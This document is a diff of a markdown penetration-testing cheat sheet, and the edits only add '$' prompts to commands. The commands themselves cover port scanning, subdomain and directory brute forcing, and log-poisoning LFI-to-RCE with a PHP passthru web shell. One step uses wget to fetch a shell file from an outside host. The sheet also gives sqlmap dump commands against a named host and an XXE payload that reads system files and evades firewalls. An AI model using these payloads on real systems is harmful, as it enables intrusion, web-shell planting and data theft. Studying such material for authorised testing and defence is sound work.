@@ -54,16 +54,16 @@ nslookup [ hostname/ip ]
 **Nmap**  
 ```
 Aggressive service/OS detection:
-nmap -sV --version-intensity 5 [ hostname/ip ]
+$ nmap -sV --version-intensity 5 [ hostname/ip ]
 
 Scan all ports:
-nmap -p- [ hostname/ip ]
+$ nmap -p- [ hostname/ip ]
 
 Scan most common ports (fast):
-nmap -F [ hostname/ip ]
+$ nmap -F [ hostname/ip ]
 
 Increase Verbosity / Debugging:
-nmap -vv OR -dd [ hostname/ip ]
+$ nmap -vv OR -dd [ hostname/ip ]
 ```
 
 ---
@@ -72,12 +72,12 @@ nmap -vv OR -dd [ hostname/ip ]
 
 **LEVEL 1: Aquatone**
 ```
-aquatone-discover --domain [ ns.agency ]            // run subdomain bruteforcing
-cat ~/aquatone/example.com/hosts.txt                // show discovered subdomains
+$ aquatone-discover --domain [ ns.agency ]            // run subdomain bruteforcing
+$ cat ~/aquatone/example.com/hosts.txt                // show discovered subdomains
 ```
 **LEVEL 2: AltDNS**
 ```
-./altdns.py -i [ input.txt ] -o [ output.txt ] -w [ wordlist.txt ] -r -s [ valid_subdomains.txt ]
+$ ./altdns.py -i [ input.txt ] -o [ output.txt ] -w [ wordlist.txt ] -r -s [ valid_subdomains.txt ]
 
 -i input.txt  => list of known subdomains.
 -o output.txt => contain list of altered/permuted subdomains that have been tested.
@@ -85,15 +85,9 @@ cat ~/aquatone/example.com/hosts.txt                // show discovered subdomain
 -w wordlist.txt => list of words that you would like to permute your current subdomains with.
 ```
 **GoBuster DNS Mode**
-```
-See below instructions @ dir bruteforcing.
-go run main.go -m dns -u [ https://ns.agency ] -w /path/to/wordlist      // run subdomain bruteforcing
-```
+`$ go run main.go -m dns -u [ https://ns.agency ] -w /path/to/wordlist      // run subdomain bruteforcing`
 **GoBuster Directory Mode**
-```
-cd /Users/brianlam/go/src/gobuster                  // go to gobuster sources
-go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common.wordlist    // run dir bruteforcing
-```
+`$ go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common.wordlist    // run dir bruteforcing`
 
 ---
 ### Authentication & Session Management
@@ -139,15 +133,15 @@ STEP #3: Inject a payload into the logfile:
      * URL query string: `example.com/?q=injectpaylod`
      * HTTP Headers: Referer header.
 ```
-<?php passthru($_GET['cmd']); ?>
-<?php passthru(['ls -l']); ?>
+$ <?php passthru($_GET['cmd']); ?>
+$ <?php passthru(['ls -l']); ?>
 ```
 
 STEP #4: With command execution, use wget to upload your own files to the server:
 ```
-/var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
+$ /var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
 OR
-<?php passthru(['w']); ?>
+$ <?php passthru(['w']); ?>
 ```
 
 Another LFI / LFI->RCE Cheatsheet:  
@@ -175,11 +169,10 @@ company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED
 **Sqlmap Commands**
 ```
 Enumerate everything:
-python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap
--a --level=3
+$ python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap -a --level=3
 
 Enumerate a specific database:
-python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
+$ python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
 ```
 
 ---
@@ -216,11 +209,11 @@ XXE standard:
 * NOTE: "FILe" upper/lowercase mix was to bypass firewalls
 * Use a valid XML feed, otherwise it will probably fail to parse. i.e. chuck `&xxe;` in legit xml elements in the feed.
 ```
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE data [
-        <!ENTITY xxe SYSTEM "FILe:%2F%2F%2Fetc/hosts" >
-]>
-<element>&xxe;</element>
+$ <?xml version="1.0" encoding="UTF-8"?>
+$ <!DOCTYPE data [
+$         <!ENTITY xxe SYSTEM "FILe:%2F%2F%2Fetc/hosts" >
+$ ]>
+$ <element>&xxe;</element>
 ```
 
 XXE Out-of-Bounds attack:
